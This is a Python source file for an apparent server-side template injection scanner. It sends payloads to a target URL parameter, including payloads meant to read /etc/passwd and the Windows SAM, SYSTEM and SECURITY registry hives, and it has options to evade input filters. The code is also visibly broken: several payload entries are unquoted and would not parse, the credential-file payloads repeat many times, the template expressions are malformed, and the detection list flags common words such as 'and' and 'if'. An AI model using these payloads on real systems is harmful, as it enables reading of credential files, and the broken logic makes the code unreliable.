import requests
import urllib.parse
import time
import random
from bs4 import BeautifulSoup

class SSTIScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "COMMENT_BYPASS": False,
            "URL_ENCODE": True
        }
        
        self.payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "${{7*7}}",
            "#{{7*7}}",
            "<%= 7*7 %>",
            ${7*7},
            #{7*7},
            {{7*'7'}},
            {{7*'7'}},
            "{{''.class.mro[1].subclasses()}}",
            "{{''.class.mro[1].subclasses()[40]('/etc/passwd').read()}}",
            "{{''.class.mro[1].subclasses()[40]('/etc/passwd').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/win.ini').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/drivers/etc/hosts').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/boot.ini').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SAM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SYSTEM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SECURITY').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SOFTWARE').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/DEFAULT').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SAM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SYSTEM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SECURITY').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SOFTWARE').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/DEFAULT').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SAM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SYSTEM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SECURITY').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SOFTWARE').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/DEFAULT').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SAM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SYSTEM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SECURITY').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SOFTWARE').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/DEFAULT').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SAM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SYSTEM').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SECURITY').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/SOFTWARE').read()}}",
            "{{''.class.mro[1].subclasses()[40]('C:/Windows/System32/config/RegBack/DEFAULT').read()}}"
        ]
        
        self.error_patterns = [
            "jinja2",
            "mako",
            "tornado",
            "django",
            "flask",
            "twig",
            "smarty",
            "freemarker",
            "velocity",
            "thymeleaf",
            "handlebars",
            "mustache",
            "liquid",
            "nunjucks",
            "pug",
            "ejs",
            "erb",
            "slim",
            "haml",
            "jade",
            "template",
            "render",
            "syntax error",
            "invalid",
            "unexpected",
            "undefined",
            "not found",
            "cannot",
            "failed",
            "exception",
            "traceback",
            "error",
            "warning",
            "fatal",
            "critical",
            "stack",
            "debug",
            "info",
            "notice",
            "parse",
            "eval",
            "exec",
            "system",
            "shell",
            "command",
            "code",
            "script",
            "function",
            "class",
            "object",
            "method",
            "property",
            "attribute",
            "variable",
            "parameter",
            "argument",
            "value",
            "key",
            "index",
            "array",
            "list",
            "dict",
            "tuple",
            "set",
            "string",
            "integer",
            "float",
            "boolean",
            "none",
            "null",
            "true",
            "false",
            "and",
            "or",
            "not",
            "if",
            "else",
            "elif",
            "for",
            "while",
            "break",
            "continue",
            "pass",
            "return",
            "yield",
            "raise",
            "assert",
            "import",
            "from",
            "as",
            "def",
            "class",
            "lambda",
            "try",
            "except",
            "finally",
            "with",
            "global",
            "nonlocal",
            "del",
            "in",
            "is",
            "lambda",
            "async",
            "await"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("COMMENT_BYPASS"):
            payload = self.comment_bypass(payload)
        
        if self.get_option("URL_ENCODE"):
            payload = urllib.parse.quote(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def random_space(self, payload):
        result = []
        for c in payload:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '/**/', '%20', '+']))
        return ''.join(result)
    
    def comment_bypass(self, payload):
        return payload.replace(' ', '/**/')
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        vulnerabilities = []
        
        for i, payload in enumerate(self.payloads, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable, vuln_type = self.test_payload(url, param, processed_payload, method, timeout, headers)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers)
            
            for pattern in self.error_patterns:
                if pattern.lower() in response.text.lower():
                    return True, "Error-based SSTI"
            
            if "49" in response.text and "7*7" in payload:
                return True, "Math-based SSTI"
            
            if "class" in response.text and "subclasses" in response.text:
                return True, "Object-based SSTI"
            
            if "root:" in response.text or "[boot loader]" in response.text:
                return True, "File-based SSTi"
            
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass
        
        return False, None
